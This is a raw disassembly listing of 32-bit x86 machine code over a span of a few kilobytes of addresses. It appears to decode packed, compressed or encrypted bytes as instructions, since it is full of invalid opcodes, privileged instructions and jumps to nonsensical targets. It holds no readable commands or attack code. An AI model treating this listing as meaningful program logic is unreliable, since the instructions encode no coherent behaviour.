  421fc4:	lods   al,BYTE PTR ds:[esi]
  421fc5:	lods   eax,DWORD PTR ds:[esi]
  421fc6:	or     ebx,ebp
  421fc8:	adc    eax,0xa0dd42c3
  421fcd:	xchg   esi,eax
  421fce:	ds sti 
  421fd0:	retf   
  421fd1:	pop    ebp
  421fd2:	in     al,dx
  421fd3:	mov    eax,0xb67b686
  421fd8:	test   DWORD PTR [ecx+0x41],ebx
  421fdb:	mov    eax,eax
  421fdd:	aad    0x43
  421fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fe0:	jmp    0x421f62
  421fe2:	sub    DWORD PTR ds:0xd72d6fb1,edi
  421fe8:	push   cs
  421fe9:	hlt    
  421fea:	jp     0x421f6e
  421fec:	hlt    
  421fed:	pusha  
  421fee:	and    eax,0x23c7767a
  421ff3:	retf   0xc55e
  421ff6:	cmp    eax,ecx
  421ff8:	outs   dx,BYTE PTR ds:[esi]
  421ff9:	fstp   DWORD PTR [ecx-0x64dde229]
  421fff:	hlt    
  422000:	lahf   
  422001:	sub    eax,0x23eaf70c
  422006:	inc    edi
  422007:	sub    bh,BYTE PTR [edx]
  422009:	test   esi,0xed9cad34
  42200f:	in     al,0x12
  422011:	cmc    
  422012:	jge    0x421fe8
  422014:	fdivp  st(3),st
  422016:	shl    dl,1
  422018:	xchg   al,bh
  42201a:	rcl    dh,0x2e
  42201d:	call   0xcf652a2a
  422022:	mov    esp,0x97a03b40
  422027:	nop
  422028:	cli    
  422029:	mov    ah,0x48
  42202b:	in     al,dx
  42202c:	sbb    bl,BYTE PTR [eax]
  42202e:	int3   
  42202f:	dec    edi
  422030:	cmc    
  422031:	xchg   esi,eax
  422032:	mov    edx,0xc91354c4
  422037:	mov    bh,0x49
  422039:	dec    ebx
  42203a:	push   edx
  42203b:	jl     0x42201c
  42203d:	mov    ebp,?
  42203f:	sub    bh,bh
  422041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422042:	cmp    esp,esp
  422044:	and    BYTE PTR [eax+ebx*4],0x54
  422048:	std    
  422049:	add    dh,BYTE PTR [ebp+0x20f5e4a4]
  42204f:	adc    eax,ecx
  422051:	jmp    0x422039
  422053:	xlat   BYTE PTR ds:[ebx]
  422054:	jno    0x422060
  422056:	(bad)  
  422058:	xchg   ebp,eax
  422059:	rcr    edi,0xaa
  42205c:	das    
  42205d:	(bad)  
  42205e:	ret    
  42205f:	mov    eax,ds:0xd20dc6cd
  422064:	pusha  
  422065:	jnp    0x4220bf
  422067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422068:	repz int 0x3f
  42206b:	leave  
  42206c:	pop    ebx
  42206d:	xchg   esi,eax
  42206e:	das    
  42206f:	jbe    0x4220ee
  422071:	call   0xa913:0xd6ba693c
  422078:	icebp  
  422079:	sub    ch,BYTE PTR [edi]
  42207b:	mov    ebx,0x41abafd5
  422080:	sbb    BYTE PTR fs:[edx+0x70],dh
  422084:	repnz xchg edi,edi
  422087:	gs or  eax,0x1c0fb7e5
  42208d:	outs   dx,BYTE PTR ds:[esi]
  42208e:	fucomi st,st(0)
  422090:	cmp    esi,DWORD PTR [ebx-0x5c]
  422093:	mov    esi,0x6d9e3113
  422098:	and    al,0x2
  42209a:	rcl    BYTE PTR [ebx],1
  42209c:	scas   eax,DWORD PTR es:[edi]
  42209d:	add    ah,BYTE PTR [esi-0x6c]
  4220a0:	lods   al,BYTE PTR ds:[esi]
  4220a1:	gs or  eax,0xddf10f96
  4220a7:	adc    DWORD PTR [esi],esi
  4220a9:	lahf   
  4220aa:	fs (bad) 
  4220ac:	pop    ds
  4220ad:	vunpckhps ymm6,ymm4,YMMWORD PTR [ebx+0x378946b8]
  4220b5:	enter  0x89ca,0x48
  4220b9:	outs   dx,DWORD PTR ds:[esi]
  4220ba:	sar    DWORD PTR [edi],1
  4220bc:	xchg   edi,eax
  4220bd:	xchg   ebp,eax
  4220be:	sub    eax,0x181e6f78
  4220c3:	sbb    eax,edi
  4220c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220c6:	retf   0xc8d1
  4220c9:	sbb    esp,DWORD PTR [edx-0x29e8ec3]
  4220cf:	mov    eax,ds:0x908446b9
  4220d4:	cmc    
  4220d5:	arpl   WORD PTR ds:0x2f1ad46a,dx
  4220db:	push   ebx
  4220dc:	push   edx
  4220dd:	push   es
  4220de:	adc    al,0x34
  4220e0:	imul   BYTE PTR [edi+eax*1+0x4c61a2c9]
  4220e7:	and    al,0x91
  4220e9:	jns    0x4220eb
  4220eb:	stos   BYTE PTR es:[edi],al
  4220ec:	add    BYTE PTR [edi-0x15],dh
  4220ef:	sbb    BYTE PTR ds:0x64043bf0,cl
  4220f5:	push   ebp
  4220f6:	push   esi
  4220f7:	(bad)  
  4220f9:	retf   
  4220fa:	and    al,0x54
  4220fc:	imul   ebp,DWORD PTR [eax-0x25],0x6d
  422100:	ficom  WORD PTR [ecx+edx*2-0x2c]
  422104:	sahf   
  422105:	jecxz  0x4220fa
  422107:	xor    dh,ah
  422109:	mov    esp,0xd5be4ec5
  42210e:	mov    al,ds:0xc655ef81
  422113:	jle    0x422149
  422115:	jnp    0x422119
  422117:	ins    BYTE PTR es:[edi],dx
  422118:	mov    dl,0x6e
  42211a:	setg   BYTE PTR [esi]
  42211d:	gs xchg ecx,eax
  42211f:	mov    edi,0xc4674e4e
  422124:	in     eax,dx
  422125:	mov    dl,0xa
  422127:	out    dx,al
  422128:	mov    ebx,0x11745461
  42212d:	jle    0x4220ed
  42212f:	jle    0x4221a9
  422131:	popf   
  422132:	or     cl,bh
  422134:	pop    ds
  422135:	adc    ah,bh
  422137:	adc    ebp,DWORD PTR [esi-0x499c0cd3]
  42213d:	xor    cx,WORD PTR [ebx]
  422140:	mov    BYTE PTR [esi+0x53],ch
  422143:	(bad)  
  422144:	mov    dh,0xd
  422146:	test   DWORD PTR [eax],ebp
  422148:	popf   
  422149:	xchg   edx,eax
  42214a:	test   edi,0xc7e53fe9
  422150:	dec    ebx
  422151:	jmp    0xf6ed:0xa490e734
  422158:	and    al,0x55
  42215a:	lea    eax,[ebx-0x3d]
  42215d:	clc    
  42215e:	aam    0x67
  422160:	xor    eax,0x9bac9b99
  422165:	xchg   esp,eax
  422166:	lahf   
  422167:	push   esp
  422168:	clc    
  422169:	cld    
  42216a:	imul   ebx,DWORD PTR [ebx],0xc777aa27
  422170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422171:	mov    edi,0x7b3a7f17
  422176:	ss scas eax,DWORD PTR es:[edi]
  422178:	ja     0x42214e
  42217a:	add    BYTE PTR [bp+0x3e],cl
  42217e:	retf   0x538
  422181:	(bad)  
  422182:	nop
  422183:	or     cl,dh
  422185:	lahf   
  422186:	sar    BYTE PTR [ebx-0x1c],0xbb
  42218a:	scas   eax,DWORD PTR es:[edi]
  42218b:	xchg   ecx,eax
  42218c:	cmp    DWORD PTR [edi+0x0],ebp
	...
  42219a:	push   ebx
  42219b:	(bad)  
  42219c:	(bad)  
  42219d:	push   esi
  42219e:	(bad)  
  42219f:	jle    0x42219c
  4221a1:	xlat   BYTE PTR ds:[ebx]
  4221a2:	retf   
  4221a3:	push   ds
  4221a4:	test   DWORD PTR [ebp-0x24],0xd4142363
  4221ab:	pushf  
  4221ac:	add    DWORD PTR [eax],eax
  4221ae:	cld    
  4221af:	add    DWORD PTR [eax],eax
  4221b1:	add    dl,ah
  4221b3:	test   cl,ch
  4221b5:	popa   
  4221b6:	out    0x5d,al
  4221b8:	test   eax,0xc876b0f
  4221bd:	dec    edx
  4221be:	push   es
  4221bf:	test   al,0x15
  4221c1:	jae    0x422228
  4221c3:	push   ebp
  4221c4:	cmp    edi,DWORD PTR [ecx+0x31745647]
  4221ca:	(bad)  
  4221cb:	outs   dx,BYTE PTR ds:[esi]
  4221cc:	std    
  4221cd:	xor    al,0xce
  4221cf:	stos   DWORD PTR es:[edi],eax
  4221d0:	and    bl,BYTE PTR [esi-0x18]
  4221d3:	(bad)  
  4221d4:	pop    edi
  4221d5:	fisttp WORD PTR ds:[esi+0x34]
  4221d9:	lock inc ecx
  4221db:	lea    edi,[edi]
  4221dd:	sub    eax,DWORD PTR [esi+0x79548f0]
  4221e3:	iret   
  4221e4:	ret    0xab2e
  4221e7:	pop    esi
  4221e8:	push   esi
  4221e9:	sub    eax,0x1669a3e6
  4221ee:	dec    ebx
  4221ef:	mov    esi,0xa80a356f
  4221f4:	fmul   QWORD PTR [ebp+0x12]
  4221f7:	in     eax,dx
  4221f8:	fdivp  st(6),st
  4221fa:	inc    edx
  4221fb:	pop    edi
  4221fc:	call   0xa7cf:0xeb3c74e2
  422203:	fbstp  TBYTE PTR [edi]
  422205:	pop    es
  422206:	retf   
  422207:	lds    ecx,FWORD PTR [ebx]
  422209:	into   
  42220a:	into   
  42220b:	out    0xcb,al
  42220d:	cmp    DWORD PTR [ecx-0x43525bfa],0xce12e4d0
  422217:	test   DWORD PTR [ebp+0x29],esp
  42221a:	push   ss
  42221b:	(bad)  
  42221c:	ss add al,0xf5
  42221f:	fwait
  422220:	out    dx,eax
  422221:	fiadd  WORD PTR [ebx+0x5dcaa65c]
  422227:	push   0x72
  422229:	clc    
  42222a:	pop    ecx
  42222b:	xchg   esi,eax
  42222c:	fld    DWORD PTR [edi]
  42222e:	cmp    esi,DWORD PTR [ebx+0x7d565f0e]
  422234:	push   cs
  422235:	or     DWORD PTR [edi-0x6c],edx
  422238:	jecxz  0x42222e
  42223a:	mov    edx,0x31b39c2d
  42223f:	adc    bh,BYTE PTR [eax-0x2a]
  422242:	push   ebx
  422243:	mov    eax,ds:0x8319d82b
  422248:	lods   eax,DWORD PTR ds:[esi]
  422249:	mov    bl,0x1c
  42224b:	dec    eax
  42224c:	fsub   st(0),st
  42224e:	sahf   
  42224f:	(bad)  
  422250:	sbb    BYTE PTR [edi-0x3da3ba79],cl
  422256:	and    ah,BYTE PTR [ebx+edi*8+0x588455d1]
  42225d:	stos   BYTE PTR es:[edi],al
  42225e:	dec    edi
  42225f:	or     eax,0xd3dd5ad0
  422264:	mov    esp,0x3b162cd0
  422269:	jne    0x422282
  42226b:	lods   eax,DWORD PTR ds:[esi]
  42226c:	adc    cl,cl
  42226e:	mov    ah,0xfa
  422270:	cwde   
  422271:	mov    esi,0x50a02ac0
  422276:	xchg   ebx,eax
  422277:	pop    eax
  422278:	shl    BYTE PTR [eax],0xaf
  42227b:	jg     0x422212
  42227d:	jns    0x422266
  42227f:	cdq    
  422280:	stos   BYTE PTR es:[edi],al
  422281:	xchg   ebx,eax
  422282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422283:	and    ah,dh
  422285:	stc    
  422286:	mov    edi,0xf66f692c
  42228b:	mov    eax,ds:0x201c9d89
  422290:	pop    esp
  422291:	sub    eax,0x29c803ca
  422296:	add    ch,cl
  422298:	push   0x41
  42229a:	xor    dl,BYTE PTR [ebp+0x18]
  42229d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42229e:	pop    esp
  42229f:	and    al,0xbc
  4222a1:	imul   eax,ebx,0x77b12e79
  4222a7:	retf   0xcb88
  4222aa:	ud0    edx,DWORD PTR [edx+0x5e]
  4222ae:	sub    eax,0x1487ca0e
  4222b3:	xor    BYTE PTR [edi],cl
  4222b5:	sbb    edx,esi
  4222b7:	mov    ds:0xf784d65d,al
  4222bc:	xchg   esi,eax
  4222bd:	int    0xc1
  4222bf:	lea    eax,[ecx+0x4290ab3c]
  4222c5:	rol    BYTE PTR [ecx+0x63],0xef
  4222c9:	xor    esp,DWORD PTR [eax]
  4222cb:	pop    edx
  4222cc:	pop    eax
  4222cd:	std    
  4222ce:	jo     0x42229e
  4222d0:	xor    DWORD PTR [edx+0x25],edx
  4222d3:	push   es
  4222d4:	push   eax
  4222d5:	mov    al,0x13
  4222d7:	or     DWORD PTR [edx],eax
  4222d9:	inc    edx
  4222da:	imul   esp,DWORD PTR [ecx+esi*4+0x2601075f],0x428a3eab
  4222e5:	int3   
  4222e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222e7:	mov    ?,WORD PTR [edi]
  4222e9:	push   0x1090f364
  4222ee:	mov    al,0x96
  4222f0:	in     al,dx
  4222f1:	or     al,0x68
  4222f3:	les    esi,FWORD PTR [ecx-0x7f]
  4222f6:	push   eax
  4222f7:	int3   
  4222f8:	sub    edx,DWORD PTR [eax]
  4222fa:	in     eax,dx
  4222fb:	jecxz  0x4222d8
  4222fd:	lock (bad) 
  422300:	nop
  422301:	dec    ecx
  422302:	pop    ss
  422303:	sub    al,0xab
  422305:	xchg   edx,eax
  422306:	xor    eax,0x473fc031
  42230b:	aas    
  42230c:	pop    ecx
  42230d:	mov    DWORD PTR [ecx],ecx
  42230f:	fld    QWORD PTR [esi+0x5c905b7b]
  422315:	jnp    0x422311
  422317:	dec    edi
  422318:	fld    st(3)
  42231a:	jns    0x42232a
  42231c:	loope  0x422337
  42231e:	xor    ah,BYTE PTR [edx+0xe8f6c0d]
  422324:	mov    ds:0xfea221bd,eax
  422329:	shl    BYTE PTR [edx+0x2cff8327],0x59
  422330:	lds    ebp,FWORD PTR [ecx]
  422332:	push   0xc55fc79d
  422337:	xchg   DWORD PTR [eax+0xaee182d],esp
  42233d:	sub    ch,cl
  42233f:	ror    eax,cl
  422341:	fs inc esp
  422343:	mov    edi,0xc4374c88
  422348:	push   esp
  422349:	adc    DWORD PTR [edx],edx
  42234b:	(bad)  
  42234c:	or     ah,BYTE PTR [ecx]
  42234e:	pop    ebp
  42234f:	aam    0x3d
  422351:	sbb    BYTE PTR [ebp+0x612c32df],0x35
  422358:	and    al,0xe
  42235a:	xlat   BYTE PTR ds:[ebx]
  42235b:	push   esp
  42235c:	mov    dh,0x30
  42235e:	aad    0x96
  422360:	leave  
  422361:	test   dh,cl
  422363:	rcr    DWORD PTR [ebp+0x2eeae08a],0x6e
  42236a:	push   esi
  42236b:	je     0x42234b
  42236d:	test   ecx,0xc57864d6
  422373:	mov    bl,BYTE PTR [ecx+0x33cc3d3f]
  422379:	or     eax,0x496b0ece
  42237e:	mov    WORD PTR [ebp-0x28],fs
  422381:	clc    
  422382:	xor    esp,ebx
  422384:	or     ebp,edi
  422386:	imul   ecx,DWORD PTR [ebp-0x4e],0xd9593b69
  42238d:	jp     0x42231e
  42238f:	push   es
  422390:	inc    ecx
  422391:	jl     0x4223f9
  422393:	cmp    al,0xea
  422395:	sbb    al,BYTE PTR [eax-0x48039070]
  42239b:	pop    esp
  42239c:	jmp    0x42240c
  42239e:	inc    eax
  42239f:	sbb    dh,dl
  4223a1:	ret    0x9886
  4223a4:	fwait
  4223a5:	xchg   ebp,eax
  4223a6:	pop    ds
  4223a7:	daa    
  4223a8:	add    esp,DWORD PTR [esi-0x71da2a6b]
	...
  4223ba:	adc    DWORD PTR [esi],ecx
  4223bc:	or     dl,ch
  4223be:	pop    ds
  4223bf:	out    dx,al
  4223c0:	repz jmp FWORD PTR [ecx-0x6c]
  4223c4:	fucomp st(0)
  4223c6:	repz retf 
  4223c8:	in     eax,0x54
  4223ca:	rcr    BYTE PTR [esi+0x1fc0001],1
  4223d0:	add    BYTE PTR [eax],al
  4223d2:	sbb    al,0x46
  4223d4:	inc    edi
  4223d5:	and    DWORD PTR [ebp+0x57c3e695],ebp
  4223db:	addr16 ror esi,1
  4223de:	imul   ebx,DWORD PTR [ecx+0x1c],0xf27ee5a8
  4223e5:	xchg   DWORD PTR [esi+0x45],ebp
  4223e8:	mov    ds:0xd8bfd96,eax
  4223ed:	xchg   ecx,eax
  4223ee:	lods   eax,DWORD PTR ds:[esi]
  4223ef:	imul   ebx,esi,0xffffff8b
  4223f2:	lahf   
  4223f3:	push   eax
  4223f4:	into   
  4223f5:	adc    eax,0x949f8ace
  4223fa:	cld    
  4223fb:	mov    ds:0x291ffe81,al
  422400:	and    bh,BYTE PTR [ebx+0x4cc78d0e]
  422406:	punpckldq mm4,DWORD PTR ds:0xb39c5015
  42240d:	and    esi,DWORD PTR [edi]
  42240f:	cs stos DWORD PTR es:[edi],eax
  422411:	pop    esi
  422412:	mov    dl,BYTE PTR [ebx-0x63]
  422415:	or     ebp,DWORD PTR [esi]
  422417:	mov    al,0xe6
  422419:	outs   dx,BYTE PTR ds:[esi]
  42241a:	xchg   esp,eax
  42241b:	add    eax,0xef6544a4
  422420:	and    eax,0x7aa6298a
  422425:	je     0x42244b
  422427:	and    dl,dh
  422429:	xor    DWORD PTR [ecx+ecx*4+0x78],edx
  42242d:	leave  
  42242e:	loope  0x4223e4
  422430:	and    edx,DWORD PTR [edi-0x6f]
  422433:	jge    0x42245a
  422435:	pop    ds
  422436:	or     DWORD PTR [ecx+0x14fa1f31],ebp
  42243c:	jge    0x422490
  42243e:	pop    ebx
  42243f:	jmp    0x42246e
  422441:	sub    DWORD PTR [esi],0xffffffe9
  422444:	xchg   ebx,eax
  422445:	fxch   st(1)
  422447:	inc    esi
  422448:	push   eax
  422449:	ss push ebx
  42244b:	cmp    al,0x2d
  42244d:	popa   
  42244e:	inc    ebx
  42244f:	dec    edx
  422450:	jmp    0x7d51:0x2dc0da3
  422457:	out    dx,eax
  422458:	mov    ebp,0xd8d862cb
  42245d:	push   ds
  42245e:	inc    esp
  42245f:	sbb    DWORD PTR [esi+0xff638c0],0xffffff9a
  422466:	cmp    edi,edi
  422468:	jmp    0x7606:0xb6374955
  42246f:	dec    esi
  422470:	xlat   BYTE PTR ds:[ebx]
  422471:	mov    es:0xec68158b,eax
  422477:	jnp    0x42244a
  422479:	(bad)  
  42247a:	das    
  42247b:	in     al,0xdf
  42247d:	cmp    BYTE PTR [esi-0xa3c85eb],dl
  422483:	inc    eax
  422484:	push   0xb9f8f7d6
  422489:	sbb    al,0x5
  42248b:	loopne 0x42247e
  42248d:	aas    
  42248e:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422490:	push   0xffffffe3
  422492:	pusha  
  422493:	(bad)  
  422494:	inc    DWORD PTR [eax-0x4189b826]
  42249a:	push   ecx
  42249b:	add    BYTE PTR [edi],bh
  42249d:	test   eax,0x2a719701
  4224a2:	or     BYTE PTR [ecx-0x18],ah
  4224a5:	rcl    ah,cl
  4224a7:	mov    al,0xfe
  4224a9:	cmovns edx,DWORD PTR [ebp-0x22]
  4224ad:	outs   dx,DWORD PTR ds:[esi]
  4224ae:	push   ebp
  4224af:	loope  0x422449
  4224b1:	cwde   
  4224b2:	out    0x4d,al
  4224b4:	mov    ecx,0x8f45b934
  4224b9:	push   eax
  4224ba:	out    dx,eax
  4224bb:	aaa    
  4224bc:	xadd   BYTE PTR ds:0xb5f62de2,dh
  4224c3:	cmp    DWORD PTR [ecx],0xefea914b
  4224c9:	repnz stos BYTE PTR es:[edi],al
  4224cb:	arpl   WORD PTR [edx+0x37],sp
  4224ce:	mov    esp,0x223b93c
  4224d3:	int    0x3e
  4224d5:	out    dx,eax
  4224d6:	into   
  4224d7:	outs   dx,BYTE PTR ds:[esi]
  4224d8:	scas   eax,DWORD PTR es:[edi]
  4224d9:	jne    0x4224b3
  4224db:	sbb    ebp,edi
  4224dd:	push   ecx
  4224de:	xchg   esi,eax
  4224df:	stos   DWORD PTR es:[edi],eax
  4224e0:	mulps  xmm6,xmm1
  4224e3:	cmp    bl,BYTE PTR [edi-0x1d1ab7ef]
  4224e9:	or     DWORD PTR [edx+0x19],eax
  4224ec:	popa   
  4224ed:	cwde   
  4224ee:	mov    ch,0xc2
  4224f0:	(bad)
  4224f3:	icebp  
  4224f4:	(bad)  
  4224f5:	mov    ds:0xa9b01b00,eax
  4224fa:	and    bh,BYTE PTR [edi]
  4224fc:	ja     0x4224dc
  4224fe:	in     eax,0x12
  422500:	jecxz  0x42252b
  422502:	es add edi,esi
  422505:	test   eax,edi
  422507:	cmc    
  422508:	outs   dx,DWORD PTR ds:[esi]
  422509:	mov    eax,DWORD PTR [edx+0x1d46952b]
  42250f:	mov    ebp,DWORD PTR [ebx-0x8]
  422512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422513:	add    edx,esi
  422515:	xchg   esi,eax
  422516:	ja     0x4224f0
  422518:	dec    edi
  422519:	push   es
  42251a:	xor    ecx,DWORD PTR [esi-0x55]
  42251d:	mov    al,ds:0xd5333248
  422522:	mov    ds:0xa7418c08,al
  422527:	and    al,ch
  422529:	push   ecx
  42252a:	sub    BYTE PTR [ebx-0x66],bh
  42252d:	push   DWORD PTR [esi+0x3]
  422530:	sbb    edx,esi
  422532:	cmp    cl,dh
  422534:	inc    eax
  422535:	gs push es
  422537:	pushf  
  422538:	arpl   WORD PTR [esi],di
  42253a:	and    eax,DWORD PTR [ebx]
  42253c:	scas   al,BYTE PTR es:[edi]
  42253d:	mov    WORD PTR [eax+0x77],gs
  422540:	inc    esi
  422541:	in     al,0xf9
  422543:	scas   al,BYTE PTR es:[edi]
  422544:	and    bh,al
  422546:	ss sub edx,0x8b5d6494
  42254d:	cs cdq 
  42254f:	and    ebp,ebx
  422551:	dec    ecx
  422552:	xchg   edi,eax
  422553:	cmc    
  422554:	jb     0x42257f
  422556:	int3   
  422557:	mov    ch,0xd3
  422559:	jmp    0x422538
  42255b:	add    cl,cl
  42255d:	fist   DWORD PTR [eax+0x6e]
  422560:	(bad)
  422564:	addr16 mov ebx,0x3bdd2ff5
  42256a:	jns    0x422557
  42256c:	pushf  
  42256d:	mov    al,0x8d
  42256f:	mov    DWORD PTR [ebp+0x3c],ecx
  422572:	call   0xfa8cfa72
  422577:	shl    BYTE PTR gs:0x27a92094,cl
  42257e:	xchg   edx,eax
  42257f:	or     edi,DWORD PTR [esi-0x1bc358ae]
  422585:	pop    eax
  422586:	adc    bh,BYTE PTR [eax]
  422588:	cwde   
  422589:	jmp    0x42257f
  42258b:	std    
  42258c:	cmp    al,0x1
  42258e:	sub    eax,0xa95cffb1
  422593:	inc    esp
  422594:	stos   BYTE PTR es:[edi],al
  422595:	mov    ebp,cs
  422597:	stc    
  422598:	cs aam 0xa3
  42259b:	dec    esp
  42259c:	fs adc bh,bh
  42259f:	cmp    ebx,ebp
  4225a1:	inc    esi
  4225a2:	mov    cl,0x81
  4225a4:	or     al,BYTE PTR [edi-0x6e42234]
  4225aa:	ss push ebx
  4225ac:	jg     0x422622
  4225ae:	mov    bl,0x61
  4225b0:	and    DWORD PTR ds:0x4e80a12a,0x1e642602
  4225ba:	mov    cl,0x73
  4225bc:	mov    WORD PTR [esi+ebx*8-0x32f0e0b0],fs
  4225c3:	jmp    0xd56e388f
  4225c8:	mov    al,0xe9
  4225ca:	jae    0x422628
  4225cc:	shr    BYTE PTR [ebp+0x0],cl
	...
  4225da:	leave  
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    esp,DWORD PTR [edi]
  4225e7:	mov    ds:0xa0cca98e,eax
  4225ec:	add    DWORD PTR [eax],eax
  4225ee:	cld    
  4225ef:	add    DWORD PTR [eax],eax
  4225f1:	add    dl,bh
  4225f3:	sub    BYTE PTR [edx+0x5e1f0297],cl
  4225f9:	les    esi,FWORD PTR ds:0x264ef268
  4225ff:	rcl    bh,cl
  422601:	fdivr  DWORD PTR [ecx]
  422603:	fwait
  422604:	push   esp
  422605:	jns    0x4225b9
  422607:	mov    esi,0x72dd2b53
  42260c:	mov    ch,0x9b
  42260e:	jb     0x42263d
  422610:	aad    0x7f
  422612:	or     DWORD PTR [ebx],eax
  422614:	mov    ds:0x11a3586b,eax
  422619:	jns    0x4225ab
  42261b:	mov    ah,0x10
  42261d:	retf   0xff2
  422620:	push   ds
  422621:	sbb    al,0xaa
  422623:	aad    0x63
  422625:	rcl    bl,cl
  422627:	(bad)  
  422628:	shr    DWORD PTR [edx-0x4b],cl
  42262b:	iret   
  42262c:	push   ss
  42262d:	xor    eax,0x57b8d113
  422632:	pop    ds
  422633:	xor    BYTE PTR [eax+0x63],cl
  422636:	cmp    DWORD PTR [edi],edi
  422638:	scas   eax,DWORD PTR es:[edi]
  422639:	cmp    esi,DWORD PTR [edi-0x43]
  42263c:	sub    BYTE PTR [esi],0xa4
  42263f:	out    0x3a,eax
  422641:	in     eax,dx
  422642:	cmp    DWORD PTR [eax+ecx*1],esp
  422645:	(bad)  
  422646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422647:	fcomp  st(5)
  422649:	jecxz  0x4225f7
  42264b:	icebp  
  42264c:	cmp    DWORD PTR [ebx+esi*2],ebx
  42264f:	mov    ecx,0xee3f31ff
  422654:	jns    0x42260d
  422656:	ss xchg esi,eax
  422658:	or     BYTE PTR [ecx+0x55],0x56
  42265c:	dec    eax
  42265d:	mov    ecx,0x77e9f811
  422662:	shr    BYTE PTR [esi],1
  422664:	sbb    DWORD PTR [eax-0x6f],esp
  422667:	aad    0x3
  422669:	loop   0x4225fb
  42266b:	sbb    DWORD PTR ds:0xa46b3ade,0x71db84cc
  422675:	dec    BYTE PTR [ecx-0x66]
  422678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422679:	out    dx,al
  42267a:	jge    0x422677
  42267c:	mov    bh,0x8d
  42267e:	ret    0x6c0a
  422681:	jne    0x422695
  422683:	mov    ah,0x1a
  422685:	cmp    eax,ebp
  422687:	test   DWORD PTR [eax+0x55],esp
  42268a:	sub    al,0xf0
  42268c:	mov    al,0x21
  42268e:	scas   al,BYTE PTR es:[edi]
  42268f:	pop    esi
  422690:	xor    eax,0x1818fb32
  422695:	into   
  422696:	dec    ebp
  422697:	jnp    0x4226b7
  422699:	ins    BYTE PTR es:[edi],dx
  42269a:	and    BYTE PTR [edx-0x3bfe9bef],ah
  4226a0:	add    edx,DWORD PTR [ecx+0xe92ebf]
  4226a6:	dec    edi
  4226a7:	cdq    
  4226a8:	ficomp DWORD PTR [edi]
  4226aa:	mov    ebx,0x9365055a
  4226af:	or     eax,0x8a4e47bf
  4226b4:	aaa    
  4226b5:	lahf   
  4226b6:	imul   ecx,DWORD PTR [esp+ebx*8-0x3e],0xb6be34e7
  4226be:	aam    0x7f
  4226c0:	stos   DWORD PTR es:[edi],eax
  4226c1:	cmc    
  4226c2:	mov    ebp,ecx
  4226c4:	ss lock sbb eax,0x3091a6b5
  4226cb:	and    ah,BYTE PTR [ebp-0x77]
  4226ce:	add    al,0x11
  4226d0:	dec    esp
  4226d1:	test   DWORD PTR [ecx+0x14],esi
  4226d4:	nop
  4226d5:	add    al,0xb
  4226d7:	mov    bh,BYTE PTR [edx]
  4226d9:	popf   
  4226da:	aam    0xf5
  4226dc:	imul   DWORD PTR [esp+ebx*4-0x3]
  4226e0:	xchg   BYTE PTR [esi],al
  4226e2:	fcom   QWORD PTR [edi]
  4226e4:	push   0xffffffbf
  4226e6:	dec    eax
  4226e7:	mul    DWORD PTR [ebp-0x17515dc8]
  4226ed:	sub    cl,bh
  4226ef:	add    eax,esi
  4226f1:	and    al,0x6
  4226f3:	add    ch,BYTE PTR [edi-0x1b4079b5]
  4226f9:	push   ds
  4226fa:	or     al,BYTE PTR [esi-0x26]
  4226fd:	jle    0x4226b5
  4226ff:	push   esp
  422700:	sti    
  422701:	cdq    
  422702:	sbb    eax,0xe0d1117c
  422707:	and    eax,0x4a7666e9
  42270c:	sbb    ecx,ebx
  42270e:	xchg   edi,eax
  42270f:	mov    edx,0x7adec524
  422714:	sub    eax,0x463adaf3
  422719:	ret    0xcf6d
  42271c:	and    al,0x1
  42271e:	gs jmp 0xfcf36e23
  422724:	dec    ecx
  422725:	lahf   
  422726:	sbb    al,bl
  422728:	add    edi,esp
  42272a:	and    ebp,DWORD PTR [ebp+0x277248bc]
  422730:	lock ds xchg edi,eax
  422733:	dec    ebx
  422734:	lods   al,BYTE PTR ds:[esi]
  422735:	fstp   DWORD PTR [edi-0x2e]
  422738:	xchg   ebx,eax
  422739:	cs out 0x8e,eax
  42273c:	out    0x42,eax
  42273e:	mov    dh,BYTE PTR [edi+0x4fda8987]
  422744:	jg     0x4226f6
  422746:	push   ebx
  422748:	aam    0xfa
  42274a:	sti    
  42274b:	hlt    
  42274c:	ins    BYTE PTR es:[edi],dx
  42274d:	inc    ebx
  42274e:	and    DWORD PTR [edi-0x4b],ebp
  422751:	sub    ch,BYTE PTR [edx+0x3b]
  422754:	mov    BYTE PTR [ebx+0x52],ah
  422757:	ret    0x9ef8
  42275a:	aad    0xb1
  42275c:	mov    ah,0xd5
  42275e:	in     eax,dx
  42275f:	sub    edi,ebp
  422761:	push   edi
  422762:	or     ebp,DWORD PTR [ebp+0x54]
  422765:	xchg   DWORD PTR [eax+0x11e40788],esp
  42276b:	add    BYTE PTR [edx-0x7dd80b5e],ch
  422771:	not    edx
  422773:	cmp    BYTE PTR [eax+0x52],dl
  422776:	mov    dl,0xbd
  422778:	hlt    
  422779:	pop    esp
  42277a:	ds fcmove st,st(4)
  42277d:	hlt    
  42277e:	jo     0x4227f5
  422780:	jo     0x42277d
  422782:	pop    ss
  422783:	mov    eax,ds:0x37ec0334
  422788:	stc    
  422789:	push   0xbe588c4b
  42278e:	inc    ecx
  42278f:	mov    eax,0xdf5473d0
  422794:	inc    ebp
  422795:	or     bl,BYTE PTR [ecx]
  422797:	sub    al,0x7e
  422799:	dec    ebp
  42279a:	sub    al,0x0
  42279c:	pop    esi
  42279d:	sbb    BYTE PTR [edx+0x20],ah
  4227a0:	mov    cl,0xcd
  4227a2:	xchg   ecx,eax
  4227a3:	hlt    
  4227a4:	fnsave [ecx-0x7f93f989]
  4227aa:	mov    eax,DWORD PTR [edx-0x30]
